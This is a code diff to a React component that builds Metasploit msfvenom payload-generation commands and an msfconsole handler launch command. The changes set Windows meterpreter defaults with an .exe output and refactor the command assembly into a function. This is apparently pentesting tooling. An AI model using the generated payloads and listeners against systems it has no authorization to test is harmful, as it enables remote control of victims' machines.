@@ -2,7 +2,6 @@ import React from 'react';
 import { Input, Typography, Row, Divider, Select, Form, Col, Collapse } from 'antd';
 import PersistedState from 'use-persisted-state';
 import { MSFBuilder } from 'components/types/MSFBuilder';
-import QueueAnim from 'rc-queue-anim';
 
 const { Title, Paragraph } = Typography;
 
@@ -21,18 +20,21 @@ const MSFBuilder = () => {
     let format = require( '../../assets/data/Format.json' );
 
     const [ values, setValues ] = msfVenomBuilder( {
-        Payload: 'generic/shell_reverse_tcp',
+        Payload: 'windows/meterpreter/bind_tcp',
         LHOST: '10.10.13.37',
         LPORT: '4444',
-        Encoder: '',
-        EncoderIterations: '',
-        Platform: '',
-        Arch: '',
-        NOP: '',
-        BadCharacters: '',
-        Format: '',
-        Outfile: ''
+        Encoder: 'generic/none',
+        EncoderIterations: '4',
+        Platform: 'windows',
+        Arch: 'x64',
+        NOP: '200',
+        BadCharacters: "badchars",
+        Format: 'exe',
+        Outfile: 'reverse_shell.exe'
     } );
+
+    const { LHOST, LPORT, Platform, Arch, NOP, Encoder,
+        EncoderIterations, BadCharacters, Format, Outfile } = values;
 
     const launchCommand = `msfconsole -qx "use exploit/multi/handler; set PAYLOAD ${ values.Payload }; set LHOST ${ values.LHOST }; set LPORT ${ values.LPORT }; run"`;
 
@@ -44,8 +46,30 @@ const MSFBuilder = () => {
         setValues( { ...values, [ prop ]: data } );
     };
 
+    const generateCommand = ( values ) => {
+        const options = [
+            LHOST && `LHOST=${ LHOST }`,
+            LPORT && `LPORT=${ LPORT }`,
+            Platform && `--platform ${ Platform }`,
+            Arch && `-a ${ Arch }`,
+            NOP && `-n ${ NOP }`,
+            Encoder && `-e ${ Encoder }`,
+            EncoderIterations && `-i ${ EncoderIterations }`,
+            BadCharacters && `-b "${ BadCharacters }"`,
+            Format && `-f ${ Format }`,
+            Outfile && `-o ${ Outfile }`
+        ].filter( Boolean );
+
+        if ( !values.Payload ) {
+            return '';
+        }
+
+        const command = `msfvenom -p ${ values.Payload } ${ options.join( ' ' ) }`;
+        return command;
+    }
+
     return (
-        <QueueAnim delay={300} duration={1500}>
+        <div>
             <div style={{ margin: 15 }}>
                 <Title level={2} style={{ fontWeight: 'bold' }}>
                     MSF Venom Builder
@@ -73,14 +97,14 @@ const MSFBuilder = () => {
                             onChange={handleChangeSelect( 'Payload' )}
                             placeholder='python/meterpreter/reverse_http'
                             filterOption={( inputValue, option ) =>
-                                option.value.toLowerCase().indexOf( inputValue.toLowerCase() ) >= 0}
+                                option.value.toString().toUpperCase().indexOf( inputValue.toUpperCase() ) !== -1
+                            }
                         >
                             {payloads.map(
                                 (
                                     data: {
                                         value:
                                         | boolean
-                                        | React.ReactChild
                                         | React.ReactFragment
                                         | React.ReactPortal
                                         | null
@@ -135,7 +159,6 @@ const MSFBuilder = () => {
                                             data: {
                                                 value:
                                                 | boolean
-                                                | React.ReactChild
                                                 | React.ReactFragment
                                                 | React.ReactPortal
                                                 | null
@@ -185,7 +208,7 @@ const MSFBuilder = () => {
                                 {platform.map(
                                     (
                                         data: {
-                                            value: boolean | React.ReactChild | React.ReactFragment | React.ReactPortal;
+                                            value: boolean | React.ReactFragment | React.ReactPortal;
                                         },
                                         key: string | number
                                     ) => {
@@ -237,7 +260,6 @@ const MSFBuilder = () => {
                                         data: {
                                             value:
                                             | boolean
-                                            | React.ReactChild
                                             | React.ReactFragment
                                             | React.ReactPortal
                                             | null
@@ -267,17 +289,7 @@ const MSFBuilder = () => {
                         <Paragraph>
                             <pre>
                                 <Text copyable>
-                                    msfvenom -p {values.Payload}
-                                    {values.LHOST > '' && ' LHOST=' + values.LHOST}
-                                    {values.LPORT > '' && ' LPORT=' + values.LPORT}
-                                    {values.Platform > '' && ' --platform ' + values.Platform}
-                                    {values.Arch > '' && ' -a ' + values.Arch}
-                                    {values.NOP > '' && ' -n ' + values.NOP}
-                                    {values.Encoder > '' && ' -e ' + values.Encoder}
-                                    {values.EncoderIterations > '' && ' -i ' + values.EncoderIterations}
-                                    {values.BadCharacters > '' && ' -b ' + `"{values.BadCharacters}"`}
-                                    {values.Format > '' && ' -f ' + values.Format}
-                                    {values.Outfile > '' && ' -o ' + values.Outfile}
+                                    {generateCommand( values )}
                                 </Text>
                             </pre>
                         </Paragraph>
@@ -304,7 +316,7 @@ run`}
                     </Panel>
                 </Collapse>
             </div>
-        </QueueAnim>
+        </div>
     );
 };
 
